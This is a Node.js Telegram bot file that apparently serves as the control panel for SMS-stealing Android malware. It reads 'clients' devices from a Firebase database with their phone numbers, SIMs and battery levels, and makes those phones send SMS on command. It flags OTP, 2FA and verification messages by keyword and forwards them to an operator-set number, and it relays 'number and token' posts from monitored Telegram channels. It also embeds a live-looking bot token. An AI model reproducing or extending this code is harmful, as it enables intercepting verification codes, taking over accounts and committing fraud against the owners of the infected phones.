const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');

const BOT_TOKEN = '8888560487:AAH3OlSq4b40jP-fpdpGuviALcnOiKBgIA8';
const ADMIN_IDS = ['8472456673'];
const bot = new Telegraf(BOT_TOKEN);
const userData = new Map();


function isAdmin(userId) {
    return ADMIN_IDS.includes(userId.toString());
}


function getUserDb(userId) {
    const user = userData.get(userId);
    if (!user || !user.firebaseUrl) return null;
    
    return {
        url: user.firebaseUrl,
        async get(path) {
            try {
                const res = await axios.get(`${this.url}/${path}.json`, { timeout: 15000 });
                return res.data;
            } catch (e) { return null; }
        },
        async put(path, data) {
            try {
                const res = await axios.put(`${this.url}/${path}.json`, data, { timeout: 15000 });
                return res.status === 200;
            } catch (e) { return false; }
        },
        async push(path, data) {
            try {
                const res = await axios.post(`${this.url}/${path}.json`, data, { timeout: 15000 });
                return res.data;
            } catch (e) { return null; }
        }
    };
}


async function getDevice(userId, deviceId) {
    const db = getUserDb(userId);
    if (!db) return null;
    try {
        const data = await db.get(`clients/${deviceId}`);
        if (!data) return null;
        
        console.log(`📱 Device ${deviceId} raw data:`, JSON.stringify(data).slice(0, 200));
        
        // Check device online status - support multiple status formats
        let isOnline = false;
        if (data.status === true || data.status === 'true' || data.status === 1 || data.status === 'online') {
            isOnline = true;
        }
        if (data.isOnline === true || data.isOnline === 'true' || data.isOnline === 1) {
            isOnline = true;
        }
        if (data.connected === true || data.connected === 'true' || data.connected === 1) {
            isOnline = true;
        }
        if (data.lastSeen && (Date.now() - data.lastSeen) < 60000) {
            isOnline = true;
        }
        
        let sim1Number = 'N/A';
        let sim1Carrier = 'Unknown';
        let sim2Number = 'N/A';
        let sim2Carrier = 'Unknown';
        let selectedSim = 0;
        
        if (data.sims && data.sims.length > 0) {
            if (data.sims[0]) {
                sim1Number = data.sims[0].phoneNumber || data.sims[0].number || data.mobNo || 'N/A';
                sim1Carrier = data.sims[0].carrierName || data.sims[0].operator || data.service_provider || 'Unknown';
            }
            if (data.sims[1]) {
                sim2Number = data.sims[1].phoneNumber || data.sims[1].number || 'N/A';
                sim2Carrier = data.sims[1].carrierName || data.sims[1].operator || 'Unknown';
            }
            selectedSim = data.selectedSim || data.currentSim || 0;
        }
        
        return {
            id: deviceId,
            name: data.modelName || data.model || data.name || deviceId.slice(0, 8),
            phone: data.mobNo || data.phoneNumber || sim1Number || 'Unknown',
            online: isOnline,
            battery: data.battery || data.batteryLevel || data.battery_percent || '0%',
            sim1Number: sim1Number,
            sim1Carrier: sim1Carrier,
            sim2Number: sim2Number,
            sim2Carrier: sim2Carrier,
            selectedSim: selectedSim,
            sims: data.sims || [],
            rawStatus: data.status,
            lastSeen: data.lastSeen
        };
    } catch (e) { 
        console.log(`❌ Error getting device: ${e.message}`);
        return null; 
    }
}

async function getAllDevices(userId) {
    const db = getUserDb(userId);
    if (!db) return [];
    try {
        const data = await db.get('clients');
        if (!data) return [];
        const devices = [];
        for (const devId in data) {
            if (data[devId]) {

                let isOnline = false;
                if (data[devId].status === true || data[devId].status === 'true' || data[devId].status === 1 || data[devId].status === 'online') {
                    isOnline = true;
                }
                if (data[devId].isOnline === true || data[devId].isOnline === 'true' || data[devId].isOnline === 1) {
                    isOnline = true;
                }
                if (data[devId].connected === true || data[devId].connected === 'true' || data[devId].connected === 1) {
                    isOnline = true;
                }
                
                devices.push({
                    id: devId,
                    name: data[devId].modelName || data[devId].model || data[devId].name || devId.slice(0, 8),
                    phone: data[devId].mobNo || data[devId].phoneNumber || 'Unknown',
                    online: isOnline,
                    battery: data[devId].battery || data[devId].batteryLevel || '0%',
                    rawStatus: data[devId].status
                });
            }
        }
        return devices;
    } catch (e) { return []; }
}

async function getOnlineDevices(userId) {
    const db = getUserDb(userId);
    if (!db) return [];
    try {
        const data = await db.get('clients');
        if (!data) return [];
        const devices = [];
        for (const devId in data) {
            if (data[devId]) {

                let isOnline = false;
                if (data[devId].status === true || data[devId].status === 'true' || data[devId].status === 1 || data[devId].status === 'online') {
                    isOnline = true;
                }
                if (data[devId].isOnline === true || data[devId].isOnline === 'true' || data[devId].isOnline === 1) {
                    isOnline = true;
                }
                if (data[devId].connected === true || data[devId].connected === 'true' || data[devId].connected === 1) {
                    isOnline = true;
                }
                
                if (isOnline) {
                    let simInfo = '';
                    if (data[devId].sims && data[devId].sims.length > 0) {
                        simInfo = data[devId].sims.map(s => s.phoneNumber || s.number).filter(n => n && n !== 'Unknown').join(', ');
                    }
                    devices.push({
                        id: devId,
                        name: data[devId].modelName || data[devId].model || data[devId].name || devId.slice(0, 8),
                        phone: data[devId].mobNo || data[devId].phoneNumber || simInfo || 'Unknown',
                        online: true,
                        battery: data[devId].battery || data[devId].batteryLevel || '0%'
                    });
                }
            }
        }
        return devices;
    } catch (e) { return []; }
}


async function sendSms(userId, deviceId, toNumber, message) {
    const start = Date.now();
    const db = getUserDb(userId);
    if (!db) return { success: false, error: 'Firebase not connected' };
    
    const device = await getDevice(userId, deviceId);
    if (!device) return { success: false, error: 'Device not found' };
    
    console.log(`📱 Device ${deviceId} status check:`);
    console.log(`   - online: ${device.online}`);
    console.log(`   - rawStatus: ${device.rawStatus}`);
    console.log(`   - lastSeen: ${device.lastSeen}`);
    
    let cleanNumber = toNumber.toString().trim().replace('+', '');
    const timestamp = Date.now();
    const commandId = `cmd_${timestamp}_${Math.random().toString(36).substr(2, 8)}`;
    
    let simInfo = {
        simSlot: device.selectedSim || 0,
        simId: device.sims && device.sims[device.selectedSim || 0] ? device.sims[device.selectedSim || 0].simId : null,
        phoneNumber: device.phone,
        carrier: device.sim1Carrier
    };
    
    if (device.sims && device.sims.length > 0) {
        const selectedSimData = device.sims[device.selectedSim || 0];
        if (selectedSimData) {
            simInfo = {
                simSlot: device.selectedSim || 0,
                simId: selectedSimData.simId || selectedSimData.id || null,
                phoneNumber: selectedSimData.phoneNumber || selectedSimData.number || device.phone,
                carrier: selectedSimData.carrierName || selectedSimData.operator || device.sim1Carrier
            };
        }
    }
    

    const commandPath = `clients/${deviceId}/commands/sendSms`;
    const commandData = {
        targetNumber: cleanNumber,
        message: message,
        timestamp: timestamp,
        status: 'pending',
        id: commandId,
        admin_sent: true,
        simInfo: simInfo
    };
    

    const webhookPath = `clients/${deviceId}/webhookEvent/sendSms`;
    const webhookData = {
        to: cleanNumber,
        message: message,
        isSended: false,
        timestamp: timestamp,
        commandId: commandId,
        simInfo: simInfo
    };
    

    const messagesPath = `clients/${deviceId}/messages`;
    const messageData = {
        sender: 'ADMIN',
        message: `SMS sent to ${cleanNumber}: ${message}`,
        dateTime: timestamp,
        timestamp: timestamp,
        type: 'outgoing',
        targetNumber: cleanNumber,
        commandId: commandId,
        status: 'pending',
        simInfo: simInfo,
        admin_sent: true
    };
    

    const smsPath = `clients/${deviceId}/sms`;
    const smsData = {
        to: cleanNumber,
        text: message,
        timestamp: timestamp,
        status: 'pending',
        commandId: commandId
    };
    
    let success1 = false, success2 = false, success3 = false, success4 = false;
    let errors = [];
    
    try {
        const result1 = await db.put(commandPath, commandData);
        success1 = result1 === true;
        if (success1) console.log(`✅ Command written to: ${commandPath}`);
        else errors.push(`Failed to write to ${commandPath}`);
    } catch(e) { 
        console.log(`❌ Failed: ${commandPath} - ${e.message}`);
        errors.push(`${commandPath}: ${e.message}`);
    }
    
    try {
        const result2 = await db.put(webhookPath, webhookData);
        success2 = result2 === true;
        if (success2) console.log(`✅ Command written to: ${webhookPath}`);
        else errors.push(`Failed to write to ${webhookPath}`);
    } catch(e) { 
        console.log(`❌ Failed: ${webhookPath} - ${e.message}`);
        errors.push(`${webhookPath}: ${e.message}`);
    }
    
    try {
        const result3 = await db.push(messagesPath, messageData);
        success3 = result3 !== null;
        if (success3) console.log(`✅ Command written to: ${messagesPath}`);
        else errors.push(`Failed to write to ${messagesPath}`);
    } catch(e) { 
        console.log(`❌ Failed: ${messagesPath} - ${e.message}`);
        errors.push(`${messagesPath}: ${e.message}`);
    }
    
    try {
        const result4 = await db.put(smsPath, smsData);
        success4 = result4 === true;
        if (success4) console.log(`✅ Command written to: ${smsPath}`);
    } catch(e) { 
        console.log(`❌ Failed: ${smsPath} - ${e.message}`);
    }
    
    const elapsed = Date.now() - start;
    
    if (success1 || success2 || success3 || success4) {
        console.log(`✅ SMS command sent to ${cleanNumber} in ${elapsed}ms`);
        return { 
            success: true, 
            message: `SMS command sent to ${cleanNumber}`,
            elapsed: elapsed,
            commandId: commandId
        };
    }
    
    return { success: false, error: `Failed to write command to Firebase: ${errors.join(', ')}` };
}


// NEW FUNCTION: Check if message contains OTP/verification keywords
function isOtpMessage(text) {
    if (!text) return false;
    
    const lowerText = text.toLowerCase();
    
    // OTP related keywords
    const otpKeywords = [
        'one time password',
        'otp',
        'verification code',
        'verify code',
        'verification',
        'verify',
        'is your',
        'your code',
        'authorization code',
        'login code',
        'authentication code',
        'security code',
        '2fa',
        'two factor'
    ];
    
    for (const keyword of otpKeywords) {
        if (lowerText.includes(keyword)) {
            return true;
        }
    }
    
    // Check for numeric codes (4-8 digits) followed by OTP context
    const codePatterns = [
        /\b\d{4,8}\b.*(?:otp|code|verification)/i,
        /(?:otp|code|verification).*\b\d{4,8}\b/i
    ];
    
    for (const pattern of codePatterns) {
        if (pattern.test(text)) {
            return true;
        }
    }
    
    return false;
}

// NEW FUNCTION: Send full message to target number
async function sendFullMessageToNumber(userId, targetNumber, fullMessage, sourceInfo = '') {
    const user = userData.get(userId);
    if (!user || !user.monitoringDevice) {
        return { success: false, error: 'No device configured' };
    }
    
    if (!targetNumber || targetNumber.trim().length === 0) {
        return { success: false, error: 'No target number configured. Use /adnum <number>' };
    }
    
    // Format the message with source info if provided
    let messageToSend = fullMessage;
    if (sourceInfo) {
        messageToSend = `📩 *From:* ${sourceInfo}\n\n${fullMessage}`;
    }
    
    console.log(`📤 Forwarding OTP message to ${targetNumber}: ${messageToSend.slice(0, 100)}...`);
    
    return await sendSms(userId, user.monitoringDevice, targetNumber, messageToSend);
}

function extractToken(text) {
    if (!text || text.trim().length === 0) return null;
    
    console.log(`\n🔍 Extracting from: ${text.slice(0, 200)}`);
    

    let match = text.match(/To:\s*\+?(\d{10,12})[\s\n]*Message:\s*(.+?)(?=\n|$)/is);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            console.log(`✅ Format 1 (To:Message): Number=${number}, Token=${message.slice(0, 30)}`);
            return { number: number, message: message, format: 'To:Message' };
        }
    }
    

    match = text.match(/📱\s*Receipt:\s*\+?(\d{10,12})[\s\n]*🔑\s*Token:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            console.log(`✅ Format 2 (Receipt:Token): Number=${number}, Token=${message.slice(0, 30)}`);
            return { number: number, message: message, format: 'Receipt:Token' };
        }
    }
    

    match = text.match(/Receipt:\s*\+?(\d{10,12})[\s\n]*Token:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            console.log(`✅ Format 3 (Receipt:Token): Number=${number}, Token=${message.slice(0, 30)}`);
            return { number: number, message: message, format: 'Receipt:Token' };
        }
    }
    

    match = text.match(/📞\s*To:\s*\+?(\d{10,12})[\s\S]*?💬\s*Message:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            console.log(`✅ Format 4 (Emoji): Number=${number}, Token=${message.slice(0, 30)}`);
            return { number: number, message: message, format: 'Emoji' };
        }
    }
    

    match = text.match(/One-tap copy:\s*\+?(\d{10,12})\s*\|\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            console.log(`✅ Format 5 (One-tap): Number=${number}, Token=${message.slice(0, 30)}`);
            return { number: number, message: message, format: 'One-tap' };
        }
    }
    

    match = text.match(/Phone:\s*\+?(\d{10,12})[\s\n]*OTP:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            console.log(`✅ Format 6 (Phone:OTP): Number=${number}, Token=${message.slice(0, 30)}`);
            return { number: number, message: message, format: 'Phone:OTP' };
        }
    }
    

    const phoneMatch = text.match(/\b(\d{10,12})\b/);
    if (phoneMatch) {
        const number = phoneMatch[1];
        const afterNumber = text.substring(text.indexOf(number) + number.length);
        const tokenMatch = afterNumber.match(/\s+([A-Za-z0-9!@#$%^&*()_+={}\[\]|\\/?~`-]{4,})/);
        if (tokenMatch) {
            const message = tokenMatch[1].trim();
            console.log(`✅ Format 7 (Number+Token): Number=${number}, Token=${message.slice(0, 30)}`);
            return { number: number, message: message, format: 'Number+Token' };
        }
    }
    
    console.log(`❌ No token pattern matched`);
    return null;
}

// ==================== COMMANDS ====================
bot.start(async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    const stylishText = `
╔══════════════════════════════╗
║  ✦ 𝘀𝗼𝘂𝗹 𝗲𝘅𝗲 𝗮𝘂𝘁𝗼 𝘃𝗮𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 ✦  ║
║         V E R S I O N   1 . 0        ║
╚══════════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       ⚡ S E T U P   G U I D E      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ 1️⃣ /setfirebase <url>
◈ 2️⃣ /setdevice
◈ 3️⃣ /addchannel ➜ in your channel/group
◈ 4️⃣ /startmonitor

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃        📌 Q U I C K   C M D S      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /help ➜ Show all commands
◈ /id ➜ Get chat ID
◈ /adnum <number> ➜ Set number for OTP forwarding

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          🅥 🅔 🅡 🅢 🅘 🅞 🅝   1 . 0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    if (!user?.firebaseUrl) {
        await ctx.reply(stylishText);
        return;
    }
    
    const devices = await getOnlineDevices(userId);
    let deviceInfo = 'Not set';
    if (user.monitoringDevice) {
        const d = await getDevice(userId, user.monitoringDevice);
        if (d) deviceInfo = `${d.name} (${d.online ? '🟢' : '🔴'})`;
    }
    
    let targetNumInfo = 'Not set';
    if (user.otpForwardNumber) {
        targetNumInfo = user.otpForwardNumber;
    }
    
    await ctx.reply(
        `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n` +
        `┃        📊  S T A T U S        ┃\n` +
        `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
        `◈ 📡 Firebase: ✅ Connected\n` +
        `◈ 📱 Device: ${deviceInfo}\n` +
        `◈ 📢 Chats: ${user.channels?.length || 0}\n` +
        `◈ 🖥 Total Devices: ${devices.length}\n` +
        `◈ ⏱ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
        `◈ 📞 OTP Forward Number: ${targetNumInfo}\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `          🅥 🅔 🅡 🅢 🅘 🅞 🅝   1 . 0\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`
    );
});

// NEW COMMAND: /adnum - Set number for OTP forwarding
bot.command('adnum', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    }
    
    if (args.length < 2) {
        const user = userData.get(userId);
        const currentNum = user?.otpForwardNumber || 'Not set';
        return ctx.reply(
            `📞 *OTP Forward Number*\n\n` +
            `Current number: \`${currentNum}\`\n\n` +
            `Usage: \`/adnum <phone_number>\`\n` +
            `Example: \`/adnum 918955562885\`\n\n` +
            `⚠️ When OTP messages are detected, the entire message will be forwarded to this number.`,
            { parse_mode: 'Markdown' }
        );
    }
    
    let phoneNumber = args[1].trim().replace('+', '');
    
    // Validate phone number (10-15 digits)
    if (!/^\d{10,15}$/.test(phoneNumber)) {
        return ctx.reply('❌ Invalid phone number! Must be 10-15 digits.\nExample: `918955562885`', { parse_mode: 'Markdown' });
    }
    
    const user = userData.get(userId);
    user.otpForwardNumber = phoneNumber;
    userData.set(userId, user);
    
    console.log(`✅ User ${userId} set OTP forward number: ${phoneNumber}`);
    
    await ctx.reply(
        `✅ *OTP Forward Number Set!*\n\n` +
        `📞 Target Number: \`${phoneNumber}\`\n\n` +
        `⚠️ When OTP/verification messages are detected, the full message will be forwarded to this number.`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('setfirebase', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (args.length < 2) {
        await ctx.reply('❌ Usage: `/setfirebase <url>`\n\nExample: `/setfirebase https://your-project.firebaseio.com`', { parse_mode: 'Markdown' });
        return;
    }
    
    let url = args[1];
    if (!url.startsWith('https://')) url = 'https://' + url;
    if (!url.endsWith('.com') && !url.includes('.firebaseio.com')) url = url.replace(/\/$/, '');
    
    const msg = await ctx.reply('🔄 Connecting to Firebase...');
    
    try {
        await axios.get(`${url}/.json?shallow=true`, { timeout: 10000 });
        
        if (!userData.has(userId)) userData.set(userId, {});
        const user = userData.get(userId);
        user.firebaseUrl = url;
        user.channels = user.channels || [];
        user.processedMsgs = new Set();
        user.monitorActive = false;
        userData.set(userId, user);
        
        console.log(`✅ User ${userId} connected Firebase: ${url}`);
        
        await ctx.telegram.editMessageText(
            msg.chat.id, msg.message_id, null,
            `✅ *Firebase Connected!*\n\n📡 URL: \`${url}\`\n\nNext: \`/setdevice\``,
            { parse_mode: 'Markdown' }
        );
    } catch (error) {
        await ctx.telegram.editMessageText(
            msg.chat.id, msg.message_id, null,
            `❌ *Connection Failed!*\n\nError: ${error.message}`,
            { parse_mode: 'Markdown' }
        );
    }
});

bot.command('setdevice', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    }
    
    const user = userData.get(userId);
    
    // If user provides a device name or ID as argument
    if (args.length > 1) {
        const deviceInput = args[1];
        console.log(`🔍 Searching for device: ${deviceInput}`);
        
        const allDevices = await getAllDevices(userId);
        if (allDevices.length === 0) {
            return ctx.reply('❌ No devices found in Firebase!\n\nMake sure devices are connected.', { parse_mode: 'Markdown' });
        }
        
        let foundDevice = null;
        
        // Try exact ID match first
        foundDevice = allDevices.find(d => d.id === deviceInput);
        
        // If not found, try name match
        if (!foundDevice) {
            foundDevice = allDevices.find(d => 
                d.name.toLowerCase().includes(deviceInput.toLowerCase()) ||
                d.id.toLowerCase().includes(deviceInput.toLowerCase())
            );
        }
        
        if (!foundDevice) {
            let deviceList = '📱 *Available Devices:*\n\n';
            allDevices.slice(0, 10).forEach(d => {
                deviceList += `• ${d.name}\n  🆔 \`${d.id}\`\n  📞 ${d.phone}\n  ${d.online ? '🟢 Online' : '🔴 Offline'}\n\n`;
            });
            return ctx.reply(`❌ Device "${deviceInput}" not found!\n\n${deviceList}`, { parse_mode: 'Markdown' });
        }
        
        const device = await getDevice(userId, foundDevice.id);
        if (!device) return ctx.reply('❌ Device not found!', { parse_mode: 'Markdown' });
        
        user.monitoringDevice = device.id;
        userData.set(userId, user);
        
        return ctx.reply(
            `✅ *Device Set!*\n\n` +
            `📱 Name: ${device.name}\n` +
            `🆔 ID: \`${device.id}\`\n` +
            `📞 Phone: ${device.phone}\n` +
            `🔋 Battery: ${device.battery}\n` +
            `📡 Status: ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE (but will still try to send)'}\n` +
            `📱 SIM1: ${device.sim1Number} (${device.sim1Carrier})\n` +
            `${device.sim2Number !== 'N/A' ? `📱 SIM2: ${device.sim2Number} (${device.sim2Carrier})\n` : ''}` +
            `\n*Note:* Commands will be sent even if device shows offline!`,
            { parse_mode: 'Markdown' }
        );
    }
    
    // Show device selection with pagination
    const allDevices = await getAllDevices(userId);
    if (allDevices.length === 0) {
        return ctx.reply('📭 *No devices found in Firebase!*\n\nMake sure devices are connected.', { parse_mode: 'Markdown' });
    }
    
    user.deviceList = allDevices;
    user.currentPage = 0;
    userData.set(userId, user);
    
    await showDevicePage(ctx, userId, 0);
});

async function showDevicePage(ctx, userId, page) {
    const user = userData.get(userId);
    if (!user || !user.deviceList) return;
    
    const devices = user.deviceList;
    const itemsPerPage = 10;
    const totalPages = Math.ceil(devices.length / itemsPerPage);
    const start = page * itemsPerPage;
    const end = start + itemsPerPage;
    const pageDevices = devices.slice(start, end);
    
    let text = `📱 *DEVICES* (Page ${page + 1}/${totalPages})\n\n`;
    text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    
    for (const d of pageDevices) {
        text += `📱 *${d.name}*\n`;
        text += `   🆔 \`${d.id.slice(0, 20)}...\`\n`;
        text += `   📞 ${d.phone}\n`;
        text += `   🔋 ${d.battery}\n`;
        text += `   ${d.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n`;
        text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    }
    
    text += `\n⚠️ *Note:* Commands will be sent even if device shows offline!`;
    
    const buttons = [];
    
    for (const d of pageDevices) {
        buttons.push([Markup.button.callback(`📱 ${d.name.slice(0, 20)}`, `select_dev_${d.id}`)]);
    }
    
    const navButtons = [];
    if (page > 0) {
        navButtons.push(Markup.button.callback('◀️ PREV', `dev_page_${page - 1}`));
    }
    if (page < totalPages - 1) {
        navButtons.push(Markup.button.callback('NEXT ▶️', `dev_page_${page + 1}`));
    }
    if (navButtons.length > 0) {
        buttons.push(navButtons);
    }
    
    buttons.push([Markup.button.callback('❌ CANCEL', 'cancel_select')]);
    
    await ctx.reply(text, {
        ...Markup.inlineKeyboard(buttons),
        parse_mode: 'Markdown'
    });
}

bot.command('addchannel', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    }
    
    let channelId = null;
    let chatTitle = 'Unknown';
    
    if (args.length > 1) {
        channelId = args[1];
    } else if (ctx.chat.type === 'channel' || ctx.chat.type === 'supergroup' || ctx.chat.type === 'group') {
        channelId = ctx.chat.id.toString();
        chatTitle = ctx.chat.title || ctx.chat.username || 'Chat';
    } else {
        await ctx.reply(
            `❌ *How to add channel/group:*\n\n` +
            `• By ID: \`/addchannel -1003937717807\`\n` +
            `• Or send \`/addchannel\` IN the channel/group\n\n` +
            `💡 Your Chat ID: \`${ctx.chat.id}\``,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    const user = userData.get(userId);
    if (!user.channels) user.channels = [];
    
    if (user.channels.includes(channelId)) {
        return ctx.reply(`ℹ️ Chat \`${channelId}\` already monitored.`, { parse_mode: 'Markdown' });
    }
    
    user.channels.push(channelId);
    user.channelNames = user.channelNames || {};
    user.channelNames[channelId] = chatTitle;
    userData.set(userId, user);
    
    console.log(`✅ User ${userId} added chat: ${channelId} (${chatTitle})`);
    console.log(`📋 Total chats: ${user.channels.length}`);
    
    await ctx.reply(
        `✅ *Chat Added!*\n\n` +
        `📢 Name: ${chatTitle}\n` +
        `🆔 ID: \`${channelId}\`\n` +
        `📊 Total monitored chats: ${user.channels.length}\n\n` +
        `⚠️ Make bot **ADMIN** in the chat!\n` +
        `📌 Next: \`/startmonitor\``,
        { parse_mode: 'Markdown' }
    );
});

bot.command('listchannels', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    if (!user?.channels?.length) {
        await ctx.reply('📭 No channels/groups added.\n\nUse `/addchannel` in the chat or `/addchannel <chat_id>`', { parse_mode: 'Markdown' });
        return;
    }
    
    let text = '📢 *MONITORED CHATS*\n\n━━━━━━━━━━━━━━━━━━━\n';
    user.channels.forEach((ch, i) => { 
        const name = user.channelNames?.[ch] || 'Unknown';
        text += `${i+1}. ${name}\n   🆔 \`${ch}\`\n\n`;
    });
    text += `━━━━━━━━━━━━━━━━━━━\n📊 Total: ${user.channels.length} chats`;
    await ctx.reply(text, { parse_mode: 'Markdown' });
});

bot.command('removechannel', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    const user = userData.get(userId);
    
    if (!user?.channels?.length) return ctx.reply('📭 No chats to remove.');
    if (args.length < 2) return ctx.reply('Usage: `/removechannel <chat_id>`\n\nUse `/listchannels` to see IDs', { parse_mode: 'Markdown' });
    
    const idx = user.channels.indexOf(args[1]);
    if (idx === -1) return ctx.reply('❌ Chat not found.\n\nUse `/listchannels` to see all monitored chats.', { parse_mode: 'Markdown' });
    
    const removed = user.channels.splice(idx, 1)[0];
    if (user.channelNames) delete user.channelNames[removed];
    userData.set(userId, user);
    
    await ctx.reply(`✅ *Removed Chat!*\n\n🆔 \`${removed}\`\n📊 Remaining: ${user.channels.length} chats`, { parse_mode: 'Markdown' });
});

bot.command('startmonitor', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    if (!user?.firebaseUrl) return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    if (!user.monitoringDevice) return ctx.reply('❌ Use `/setdevice` first!', { parse_mode: 'Markdown' });
    if (!user.channels?.length) return ctx.reply('❌ No chats!\n\nUse `/addchannel` in a channel/group', { parse_mode: 'Markdown' });
    
    const now = new Date();
    user.monitorStartTime = now.toISOString();
    user.monitorActive = true;
    user.processedMsgs = new Set();
    userData.set(userId, user);
    
    // Get device info for display
    const device = await getDevice(userId, user.monitoringDevice);
    const deviceStatus = device ? (device.online ? '🟢 ONLINE' : '🔴 OFFLINE') : '❓ Unknown';
    const targetNumber = user.otpForwardNumber || 'Not set';
    
    console.log(`\n✅ MONITORING STARTED for user ${userId}`);
    console.log(`Device: ${user.monitoringDevice} (${deviceStatus})`);
    console.log(`Total Chats: ${user.channels.length}`);
    console.log(`OTP Forward Number: ${targetNumber}`);
    console.log(`Chats: ${JSON.stringify(user.channels)}`);
    console.log(`Time: ${now.toLocaleString()}\n`);
    
    let chatList = '';
    user.channels.slice(0, 5).forEach(ch => {
        const name = user.channelNames?.[ch] || 'Unknown';
        chatList += `   • ${name}\n`;
    });
    if (user.channels.length > 5) chatList += `   • +${user.channels.length - 5} more chats\n`;
    
    await ctx.reply(
        `✅ *MONITORING STARTED!*\n\n` +
        `📱 Device: \`${user.monitoringDevice}\`\n` +
        `📡 Device Status: ${deviceStatus}\n` +
        `📢 Monitored Chats: ${user.channels.length}\n` +
        `${chatList}\n` +
        `📞 OTP Forward Number: \`${targetNumber}\`\n` +
        `🕐 Started: ${now.toLocaleString()}\n\n` +
        `⚠️ *IMPORTANT:* \n` +
        `• Commands will be sent even if device shows offline!\n` +
        `• Token forwarding ACTIVE!\n` +
        `• OTP messages will be forwarded to your target number!\n\n` +
        `📝 *Supported Formats for Token:*\n` +
        `• To: +91XXXXX\\nMessage: TEXT\n` +
        `• 📱 Receipt: XXXXX\\n🔑 Token: TEXT\n` +
        `• Receipt: XXXXX\\nToken: TEXT`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('stop', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (userData.has(userId)) {
        userData.get(userId).monitorActive = false;
        console.log(`⏸ User ${userId} stopped monitoring`);
    }
    await ctx.reply(`⏸ *Monitor Paused*\n\nUse \`/resume\` to start.`, { parse_mode: 'Markdown' });
});

bot.command('resume', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (!user?.monitoringDevice) return ctx.reply('❌ No device set.');
    user.monitorActive = true;
    await ctx.reply(`✅ *Monitor Resumed!*`, { parse_mode: 'Markdown' });
});

bot.command('status', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (!user) return ctx.reply('❌ Not configured. Use `/setfirebase` first.', { parse_mode: 'Markdown' });
    
    const devices = await getOnlineDevices(userId);
    const allDevices = await getAllDevices(userId);
    let deviceInfo = 'Not set';
    let deviceStatus = 'Unknown';
    if (user.monitoringDevice) {
        const d = await getDevice(userId, user.monitoringDevice);
        if (d) {
            deviceInfo = `${d.name}`;
            deviceStatus = d.online ? '🟢 ONLINE' : '🔴 OFFLINE';
        }
    }
    
    await ctx.reply(
        `📊 *STATUS*\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📡 Firebase: ✅ Connected\n` +
        `📱 Device: ${deviceInfo}\n` +
        `📡 Status: ${deviceStatus}\n` +
        `📢 Chats: ${user.channels?.length || 0}\n` +
        `🖥 Total Devices: ${allDevices.length}\n` +
        `🟢 Online: ${devices.length}\n` +
        `⏱ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
        `📞 OTP Forward Number: ${user.otpForwardNumber || 'Not set'}\n` +
        `🕐 Started: ${user.monitorStartTime ? new Date(user.monitorStartTime).toLocaleString() : 'Not started'}\n` +
        `━━━━━━━━━━━━━━━━━━━\n\n` +
        `⚠️ *Note:* SMS will be sent even if device shows offline!`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('online', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (!user?.firebaseUrl) return ctx.reply('❌ Use `/setfirebase` first.', { parse_mode: 'Markdown' });
